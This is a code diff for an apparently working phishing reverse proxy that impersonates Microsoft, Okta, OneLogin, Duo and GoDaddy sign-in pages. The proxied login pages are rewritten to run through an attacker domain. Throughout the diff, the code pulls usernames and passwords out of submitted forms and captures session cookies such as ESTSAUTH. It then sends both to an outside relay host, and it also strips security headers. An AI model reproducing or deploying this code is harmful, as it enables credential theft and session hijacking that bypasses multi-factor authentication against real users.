@@ -1,7 +1,7 @@
 export const runtime = 'edge';
 
 // ==================== CONFIG ====================
-const YOUR_DOMAIN = 'proxyapp.ddns.net'; // Change to your domain
+const YOUR_DOMAIN = 'proxyapp.ddns.net';
 const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
 const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
@@ -31,12 +31,13 @@ const IDENTITY_PROVIDERS = {
   'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
 };
 
-const AUTH_COOKIES = {
-  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap', 'ESTSSC', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice'],
-  okta: ['sid', 'vid', 'authtoken', 'oktaStateToken', 'DT', 'tnt'],
-  onelogin: ['sub_session_onelogin', 'onelogin', 'sub'],
+// Only these critical auth cookies trigger exfiltration
+const CRITICAL_AUTH_COOKIES = {
+  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
+  okta: ['sid', 'authtoken'],
+  onelogin: ['sub_session_onelogin'],
   duo: ['.*'],
-  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token']
+  godaddy: ['akm_lmprb-ssn', 'auth_id']
 };
 
 const CREDENTIAL_PATTERNS = {
@@ -45,21 +46,20 @@ const CREDENTIAL_PATTERNS = {
     password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118']
   },
   okta: {
-    username: ['username', 'user', 'email', 'identifier', 'login', 'i0116'],
-    password: ['password', 'pass', 'pwd', 'credentials[passcode]', 'answer', 'credentials[password]']
+    username: ['username', 'user', 'email', 'identifier', 'login'],
+    password: ['password', 'pass', 'pwd', 'credentials[passcode]', 'answer']
   },
   onelogin: {
-    username: ['username', 'email', 'login', 'user'],
+    username: ['username', 'email', 'login'],
     password: ['password', 'pwd', 'pass']
   },
   duo: {
-    username: ['username', 'email', 'user'],
-    password: ['passcode', 'answer', 'password'],
-    device: ['device', 'phone_number']
+    username: ['username', 'email'],
+    password: ['passcode', 'answer', 'password']
   },
   godaddy: {
-    username: ['username', 'email', 'login', 'name', 'account'],
-    password: ['password', 'pwd', 'pass', 'credential']
+    username: ['username', 'email', 'login', 'account'],
+    password: ['password', 'pwd', 'pass']
   }
 };
 // =======================================================================
@@ -74,11 +74,15 @@ async function sendToVercel(type, data) {
   } catch (e) {}
 }
 
-async function exfiltrateCookiesFile(cookieText, ip, platform = 'unknown', url = '') {
+// Consolidated cookie exfiltration - only sends when critical cookies present
+async function exfiltrateCookies(cookieText, ip, platform, url) {
   try {
-    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${url}\nData: Cookies found:\n\n${cookieText}\n`;
+    // Clean URL for logging (remove query params for privacy, keep path)
+    const cleanUrl = url.split('?')[0];
+    
+    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
     const formData = new FormData();
-    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
+    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
     formData.append("ip", ip);
     formData.append("type", "cookie-file");
     
@@ -89,13 +93,11 @@ async function exfiltrateCookiesFile(cookieText, ip, platform = 'unknown', url =
   } catch (e) {}
 }
 
-// Get upstream from path or use default
 function getUpstreamInfo(pathname) {
   if (pathname.startsWith(PROXY_PREFIX)) {
     const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
     const upstreamDomain = withoutPrefix.split('/')[0];
     const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
-    
     const provider = IDENTITY_PROVIDERS[upstreamDomain];
     
     return {
@@ -114,31 +116,23 @@ function getUpstreamInfo(pathname) {
   };
 }
 
-// CRITICAL FIX: Clean query string by removing routing artifacts (path=_p&path=...)
 function cleanQueryString(search) {
   if (!search) return '';
   
   const params = new URLSearchParams(search);
   const pathValues = params.getAll('path');
   
-  // If we have multiple 'path' parameters or 'path' starts with '_p', it's Zeabur routing artifacts
   if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
-    // Remove all 'path' parameters, keep others
     const cleaned = new URLSearchParams();
     for (const [key, value] of params) {
-      if (key !== 'path') {
-        cleaned.append(key, value);
-      }
+      if (key !== 'path') cleaned.append(key, value);
     }
     const result = cleaned.toString();
     return result ? '?' + result : '';
   }
   
-  // If single 'path' param that looks legitimate (not URL segments), keep it
-  // But if it looks like a domain or path segment, remove it
   if (pathValues.length === 1) {
     const val = pathValues[0];
-    // If it contains dots (domain) or equals '_p', it's likely an artifact
     if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
       const cleaned = new URLSearchParams();
       for (const [key, value] of params) {
@@ -155,14 +149,13 @@ function cleanQueryString(search) {
 function rewriteUrls(text, upstreamDomain) {
   let result = text;
   
-  // Remove localhost references
+  // Fix localhost
   result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
   result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
   
-  // Rewrite all known domains to proxy paths
+  // Rewrite all known domains
   Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
     const escaped = domain.replace(/\./g, '\\.');
-    
     result = result.replace(
       new RegExp(`https://${escaped}(?!\\w)`, 'g'),
       `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
@@ -177,13 +170,13 @@ function rewriteUrls(text, upstreamDomain) {
     );
   });
   
-  // Handle relative paths
+  // Fix relative paths
   result = result.replace(
     /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
     `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
   );
   
-  // Fix JS hostname references
+  // Fix JS references
   result = result.replace(
     /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
     `window.location.hostname = "${YOUR_DOMAIN}"`
@@ -199,7 +192,6 @@ function rewriteUrls(text, upstreamDomain) {
 function rewriteLocation(location) {
   try {
     const url = new URL(location);
-    
     const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
                        url.hostname.includes('microsoft') || 
                        url.hostname.includes('live.com') || 
@@ -209,11 +201,20 @@ function rewriteLocation(location) {
     if (shouldProxy) {
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
     }
-    
     return location;
   } catch (e) {
     return location;
   }
+}
+
+// Check if cookies contain critical auth tokens
+function hasCriticalAuthCookies(cookieString, platform) {
+  if (!cookieString) return false;
+  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
+  return patterns.some(p => {
+    if (p === '.*') return true;
+    return cookieString.toLowerCase().includes(p.toLowerCase());
+  });
 }
 
 export default async function handleRequest(request) {
@@ -226,58 +227,84 @@ export default async function handleRequest(request) {
   
   const info = getUpstreamInfo(url.pathname);
   const upstreamDomain = info.upstream;
-  
-  // CRITICAL FIX: Clean the query string to remove Zeabur routing artifacts
   const cleanSearch = cleanQueryString(url.search);
   const upstreamPath = info.path + cleanSearch;
   const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
   
-  console.log(`[${info.type}] ${request.method} ${YOUR_DOMAIN}${url.pathname} -> ${upstreamUrl}`);
+  // Use YOUR_DOMAIN for logging to avoid localhost
+  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;
   
-  // Prepare headers
+  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);
+  
   const headers = new Headers(request.headers);
   headers.set('Host', upstreamDomain);
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
   
-  // Harvest credentials on POST
+  // ==================== CREDENTIAL HARVESTING ====================
+  let capturedCreds = null;
+  
   if (request.method === 'POST') {
     try {
       const clone = request.clone();
       const ct = clone.headers.get('content-type') || '';
-      let data = {};
+      let bodyData = {};
       
-      if (ct.includes('json')) {
-        data = await clone.json();
+      if (ct.includes('application/json')) {
+        bodyData = await clone.json();
       } else {
         const body = await clone.text();
+        // Handle both standard form data and Okta-style nested keys
         const params = new URLSearchParams(body);
-        params.forEach((v, k) => data[k] = v);
+        for (const [key, value] of params) {
+          bodyData[key] = value;
+        }
       }
       
       const patterns = CREDENTIAL_PATTERNS[info.type] || CREDENTIAL_PATTERNS.microsoft;
-      const creds = { ip, platform: info.type, upstream: upstreamDomain, url: request.url };
-      let found = false;
+      let username = null;
+      let password = null;
       
-      for (const [key, val] of Object.entries(data)) {
-        if (!val) continue;
-        const low = key.toLowerCase();
+      // Search for credentials in all fields
+      for (const [key, value] of Object.entries(bodyData)) {
+        if (!value || typeof value !== 'string') continue;
+        const lowKey = key.toLowerCase();
         
-        if (patterns.username.some(p => low.includes(p.toLowerCase()))) {
-          creds.username = val;
-          found = true;
+        // Check username patterns
+        for (const pattern of patterns.username) {
+          if (lowKey === pattern.toLowerCase() || lowKey.includes(pattern.toLowerCase())) {
+            username = value;
+            console.log(`[CRED] Found username field: ${key}`);
+            break;
+          }
         }
-        if (patterns.password.some(p => low.includes(p.toLowerCase()))) {
-          creds.password = val;
-          found = true;
+        
+        // Check password patterns
+        for (const pattern of patterns.password) {
+          if (lowKey === pattern.toLowerCase() || lowKey.includes(pattern.toLowerCase())) {
+            password = value;
+            console.log(`[CRED] Found password field: ${key}`);
+            break;
+          }
         }
       }
       
-      if (found && creds.username) {
-        await sendToVercel('credentials', creds);
+      if (username && password) {
+        capturedCreds = {
+          ip,
+          platform: info.type,
+          upstream: upstreamDomain,
+          username: username,
+          password: password,
+          url: displayUrl,
+          timestamp: new Date().toISOString()
+        };
+        
+        await sendToVercel('credentials', capturedCreds);
+        console.log(`[CREDENTIALS CAPTURED] ${username} @ ${info.type}`);
       }
     } catch (e) {
-      console.error('Harvest error:', e);
+      console.error('Credential harvest error:', e);
     }
   }
   
@@ -295,21 +322,19 @@ export default async function handleRequest(request) {
     
     const resp = await fetch(upstreamUrl, fetchOpts);
     
-    // Handle redirect
+    // Handle redirects
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
         const newHeaders = new Headers(resp.headers);
         const newLoc = rewriteLocation(loc);
-        
         console.log(`[Redirect] ${loc} -> ${newLoc}`);
-        
         newHeaders.set('Location', newLoc);
         return new Response(null, { status: resp.status, headers: newHeaders });
       }
     }
     
-    // Process response
+    // Prepare response headers
     const newHeaders = new Headers(resp.headers);
     newHeaders.set('access-control-allow-origin', '*');
     newHeaders.set('access-control-allow-credentials', 'true');
@@ -317,32 +342,47 @@ export default async function handleRequest(request) {
     newHeaders.delete('content-security-policy-report-only');
     newHeaders.delete('clear-site-data');
     
-    // Process cookies
+    // ==================== CONDITIONAL COOKIE CAPTURE ====================
+    // Only capture cookies when:
+    // 1. It's a POST request (form submission), OR
+    // 2. Response contains critical auth cookies (successful login)
+    
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
+    let shouldCaptureCookies = false;
     let cookieStr = '';
     
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
       
-      const patterns = AUTH_COOKIES[info.type] || [];
-      const hasAuth = patterns.some(p => p === '.*' || cookieStr.toLowerCase().includes(p.toLowerCase()));
+      // Condition 1: It's a POST request (likely form submission)
+      const isPost = request.method === 'POST';
       
-      if (hasAuth || cookieStr) {
-        await exfiltrateCookiesFile(cookieStr, ip, info.type, request.url);
-      }
+      // Condition 2: Critical auth cookies present (successful login)
+      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
       
+      shouldCaptureCookies = isPost || hasAuth;
+      
+      // Process cookies for browser
       cookies.forEach(c => {
         const mod = c.replace(/Domain=[^;]+;?/gi, '');
         newHeaders.append('Set-Cookie', mod);
       });
     }
     
-    // Rewrite body content
+    // Capture credentials + cookies together if we have either
+    if (shouldCaptureCookies || capturedCreds) {
+      // If we captured creds but no auth cookies yet, still send the event
+      // If we have auth cookies, send them
+      if (cookieStr) {
+        await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
+      }
+    }
+    
+    // Rewrite response body
     const ct = resp.headers.get('content-type') || '';
     if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
       let text = await resp.text();
       text = rewriteUrls(text, upstreamDomain);
-      
       return new Response(text, { status: resp.status, headers: newHeaders });
     }
     
@@ -352,8 +392,7 @@ export default async function handleRequest(request) {
     console.error(`[${info.type}] Error:`, err);
     return new Response(JSON.stringify({
       error: 'Proxy Error',
-      message: err.message,
-      upstream: upstreamDomain
+      message: err.message
     }), { status: 502, headers: { 'content-type': 'application/json' } });
   }
 }
